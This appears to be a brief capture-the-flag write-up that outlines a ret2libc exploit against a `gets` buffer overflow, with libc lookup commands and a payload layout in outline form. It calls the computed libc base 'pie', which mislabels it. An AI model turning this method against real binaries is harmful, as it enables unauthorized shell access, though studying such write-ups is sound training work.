# Level 01 Turner

## 1- Recon
### - Source code was given
### - Use of the unsafe function `gets`
### - PIE was enabled
### - The binary was leaking the address of `exit` in libc




## 2- Exploit
### - the binary was leaking the address of exit in libc we can use that to calculate pie
```markdown
pie = (address of exit inside the binary) - (address of exit inside libc)

```

### - after calculating the pie we can call any ROP gadget inside libc plus any function to give us shell execution
### - we need to find the sting "/bin/sh" inside libc, two ROP gadget (pop rdi) to set up argument of system call and (ret) to align stack

```markdown
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" # to find address of "/bin/sh" inside libc
```
```markdown
readelf -s /lib/x86_64-linux-gnu/libc.so.6  | grep "system" # to find address of system function
```
```markdown
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 # to find all rop gadget inside libc

```



### 5- Payload

```markdown
    payload = (offset) + (pop rdi) + (address of "/bin/sh") + (addres ret) + (address of system)
                                                                |-> is used to align stack for system call
    # all these addresses are added plus the pie to use them
```


